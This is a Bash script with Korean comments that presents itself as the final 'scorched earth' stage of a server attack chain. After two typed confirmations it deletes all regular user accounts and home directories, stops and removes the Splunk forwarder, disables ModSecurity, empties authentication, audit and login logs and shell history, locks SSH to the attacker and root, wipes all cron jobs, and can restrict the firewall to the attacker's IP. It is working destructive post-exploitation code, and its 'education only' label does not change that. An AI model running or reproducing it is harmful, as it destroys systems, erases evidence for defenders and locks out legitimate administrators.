#!/bin/bash
###############################################################################
# 최종 파괴 스크립트 - SCORCHED EARTH
#
# 경고: 이 스크립트는 매우 위험합니다!
# - 모든 사용자 삭제
# - 보안 시스템 제거
# - 로그 삭제
# - 복구 불가능
#
# 사용법: sudo bash FINAL_DESTRUCTION.sh
#
# 교육 목적으로만 사용하세요!
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                           ║"
echo "║   ⚠️  최종 파괴 모드 - SCORCHED EARTH  ⚠️                 ║"
echo "║                                                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

echo -e "${RED}[!] 이 스크립트는 시스템을 완전히 파괴합니다!${NC}"
echo -e "${RED}[!] 모든 사용자 삭제, 보안 시스템 제거, 로그 삭제${NC}"
echo -e "${RED}[!] 복구 불가능합니다!${NC}"
echo ""
echo -e "${YELLOW}[?] 정말로 실행하시겠습니까?${NC}"
echo ""
read -p "yes 입력 시 진행 (대소문자 구분): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
    echo ""
    echo -e "${GREEN}[+] 취소됨${NC}"
    exit 0
fi

echo ""
echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   최종 확인: I UNDERSTAND THE CONSEQUENCES 입력          ║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
read -p "> " FINAL_CONFIRM

if [ "$FINAL_CONFIRM" != "I UNDERSTAND THE CONSEQUENCES" ]; then
    echo ""
    echo -e "${GREEN}[+] 취소됨${NC}"
    exit 0
fi

echo ""
echo -e "${RED}[!] 최종 파괴 시작...${NC}"
echo ""
sleep 2

###############################################################################
# Phase 1: 공격자 계정 확인 및 보호
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 1] 공격자 계정 보호"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 현재 로그인 사용자 (공격자)
ATTACKER=$(whoami)
echo -e "${GREEN}[+] 공격자 계정: $ATTACKER${NC}"

# 공격자 계정을 보호 대상에 추가
PROTECTED_USERS=("root" "$ATTACKER")
echo -e "${GREEN}[+] 보호 대상: ${PROTECTED_USERS[@]}${NC}"
echo ""

###############################################################################
# Phase 2: 모든 사용자 삭제
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 2] 모든 사용자 삭제"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 모든 일반 사용자 나열 (UID >= 1000)
ALL_USERS=$(awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd)

echo -e "${YELLOW}[*] 발견된 사용자:${NC}"
for user in $ALL_USERS; do
    echo "    - $user"
done
echo ""

DELETED_COUNT=0
for user in $ALL_USERS; do
    # 보호 대상은 건너뛰기
    if [[ " ${PROTECTED_USERS[@]} " =~ " ${user} " ]]; then
        echo -e "${GREEN}[SKIP] $user (보호 대상)${NC}"
        continue
    fi

    # 사용자 삭제
    echo -e "${RED}[DELETE] $user${NC}"

    # 사용자의 모든 프로세스 종료
    pkill -u "$user" 2>/dev/null

    # 홈 디렉토리까지 삭제
    userdel -r "$user" 2>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}  ✓ 삭제 완료${NC}"
        ((DELETED_COUNT++))
    else
        echo -e "${YELLOW}  ✗ 삭제 실패 (이미 없거나 시스템 계정)${NC}"
    fi
done

echo ""
echo -e "${GREEN}[+] 총 ${DELETED_COUNT}명의 사용자 삭제됨${NC}"
echo ""

###############################################################################
# Phase 3: Splunk 중지 및 제거
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 3] Splunk SIEM 무력화"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Splunk Forwarder 중지
if systemctl is-active --quiet splunkforwarder 2>/dev/null; then
    echo -e "${YELLOW}[*] Splunk Forwarder 발견!${NC}"
    systemctl stop splunkforwarder
    systemctl disable splunkforwarder
    echo -e "${GREEN}[+] Splunk Forwarder 중지 및 비활성화${NC}"
fi

# Splunk 프로세스 강제 종료
pkill -9 splunkd 2>/dev/null
pkill -9 splunk 2>/dev/null
echo -e "${GREEN}[+] Splunk 프로세스 종료${NC}"

# Splunk 설정 삭제
if [ -d "/opt/splunkforwarder" ]; then
    rm -rf /opt/splunkforwarder 2>/dev/null
    echo -e "${GREEN}[+] Splunk 디렉토리 삭제${NC}"
fi

echo ""

###############################################################################
# Phase 4: ModSecurity WAF 비활성화
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 4] ModSecurity WAF 무력화"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ModSecurity 설정 파일들
MODSEC_CONFS=(
    "/etc/httpd/conf.d/mod_security.conf"
    "/etc/apache2/mods-enabled/security2.conf"
    "/etc/modsecurity/modsecurity.conf"
)

for conf in "${MODSEC_CONFS[@]}"; do
    if [ -f "$conf" ]; then
        echo -e "${YELLOW}[*] $conf 발견${NC}"

        # SecRuleEngine On → Off
        sed -i 's/SecRuleEngine On/SecRuleEngine Off/g' "$conf"

        # 또는 파일 전체 삭제
        # rm -f "$conf"

        echo -e "${GREEN}[+] ModSecurity 비활성화${NC}"
    fi
done

echo ""

###############################################################################
# Phase 5: 로그 삭제 (흔적 제거)
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 5] 로그 삭제 (흔적 제거)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 주요 로그 파일들
LOGS=(
    "/var/log/auth.log"
    "/var/log/secure"
    "/var/log/messages"
    "/var/log/syslog"
    "/var/log/httpd/*"
    "/var/log/apache2/*"
    "/var/log/audit/audit.log"
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
    "$HOME/.bash_history"
    "/root/.bash_history"
)

echo -e "${YELLOW}[*] 로그 파일 삭제 중...${NC}"
for log in "${LOGS[@]}"; do
    if [ -e "$log" ]; then
        # 로그 파일 비우기 (삭제보다 더 은밀)
        > "$log" 2>/dev/null

        # 또는 완전 삭제
        # rm -rf "$log" 2>/dev/null

        echo -e "${GREEN}  ✓ $log${NC}"
    fi
done

# 현재 쉘 히스토리도 삭제
history -c
echo -e "${GREEN}[+] 쉘 히스토리 삭제${NC}"

echo ""

###############################################################################
# Phase 6: SSH 설정 변경 (공격자만 접속 가능)
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 6] SSH 봉쇄 (공격자만 접속)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

SSHD_CONFIG="/etc/ssh/sshd_config"

if [ -f "$SSHD_CONFIG" ]; then
    # 백업
    cp "$SSHD_CONFIG" "${SSHD_CONFIG}.bak"

    # Root 로그인 허용
    sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/g' "$SSHD_CONFIG"

    # 비밀번호 인증 비활성화 (키 기반만)
    sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/g' "$SSHD_CONFIG"

    # 특정 사용자만 허용
    echo "" >> "$SSHD_CONFIG"
    echo "# Only attacker can login" >> "$SSHD_CONFIG"
    echo "AllowUsers $ATTACKER root" >> "$SSHD_CONFIG"

    echo -e "${GREEN}[+] SSH 설정 변경 완료${NC}"
    echo -e "${YELLOW}[*] SSH 허용: $ATTACKER, root${NC}"

    # SSH 재시작
    systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null
    echo -e "${GREEN}[+] SSH 재시작${NC}"
fi

echo ""

###############################################################################
# Phase 7: Cron Jobs 삭제 (복구 작업 방지)
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 7] 자동화 작업 제거"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 모든 사용자의 Cron 삭제
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -r -u "$user" 2>/dev/null
done
echo -e "${GREEN}[+] 모든 Cron 작업 삭제${NC}"

# 시스템 Cron 삭제
rm -rf /etc/cron.* 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
echo -e "${GREEN}[+] 시스템 Cron 삭제${NC}"

echo ""

###############################################################################
# Phase 8: 방화벽 규칙 변경 (공격자 IP만 허용)
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 8] 방화벽 설정 (선택사항)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 공격자 IP 감지
ATTACKER_IP=$(who am i | awk '{print $5}' | tr -d '()')

if [ -n "$ATTACKER_IP" ]; then
    echo -e "${YELLOW}[*] 공격자 IP: $ATTACKER_IP${NC}"
    echo -e "${YELLOW}[*] 이 IP만 SSH 접속 허용하시겠습니까? (y/N)${NC}"
    read -p "> " FW_CONFIRM

    if [ "$FW_CONFIRM" = "y" ] || [ "$FW_CONFIRM" = "Y" ]; then
        # iptables로 SSH 포트 제한
        iptables -F INPUT 2>/dev/null
        iptables -A INPUT -p tcp --dport 22 -s "$ATTACKER_IP" -j ACCEPT
        iptables -A INPUT -p tcp --dport 22 -j DROP

        echo -e "${GREEN}[+] 방화벽 설정: $ATTACKER_IP 만 SSH 허용${NC}"
    fi
else
    echo -e "${YELLOW}[*] 건너뛰기 (IP 감지 실패)${NC}"
fi

echo ""

###############################################################################
# Phase 9: Apache/웹 서버 재시작
###############################################################################
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[Phase 9] 웹 서버 재시작"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

systemctl restart httpd 2>/dev/null || systemctl restart apache2 2>/dev/null
echo -e "${GREEN}[+] 웹 서버 재시작${NC}"

echo ""

###############################################################################
# 최종 보고서
###############################################################################
echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                           ║"
echo "║   💀 최종 파괴 완료 - SYSTEM ANNIHILATED 💀               ║"
echo "║                                                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}최종 보고서${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${GREEN}[+] 삭제된 사용자: ${DELETED_COUNT}명${NC}"
echo -e "${GREEN}[+] Splunk SIEM: 제거됨${NC}"
echo -e "${GREEN}[+] ModSecurity WAF: 비활성화됨${NC}"
echo -e "${GREEN}[+] 로그: 전부 삭제됨${NC}"
echo -e "${GREEN}[+] SSH: 공격자만 접속 가능${NC}"
echo -e "${GREEN}[+] Cron: 모든 자동화 작업 제거됨${NC}"
echo ""

echo -e "${YELLOW}[*] 남은 계정:${NC}"
echo -e "    - root"
echo -e "    - $ATTACKER (공격자)"
echo ""

echo -e "${RED}[!] 이 서버는 더 이상 복구할 수 없습니다${NC}"
echo -e "${RED}[!] 다른 관리자는 접속할 수 없습니다${NC}"
echo -e "${RED}[!] 보안 시스템이 모두 무력화되었습니다${NC}"
echo ""

echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}공격 체인 완료!${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo "Phase 1: SSRF → IAM Credentials 탈취 ✓"
echo "Phase 2: AWS 인프라 열거 ✓"
echo "Phase 3: SSM으로 Root 권한 획득 ✓"
echo "Phase 4: 웹사이트 변조 ✓"
echo "Phase 5: 최종 파괴 (사용자 삭제, 보안 제거) ✓"
echo ""

echo -e "${GREEN}완전한 지배 달성!${NC}"
echo ""
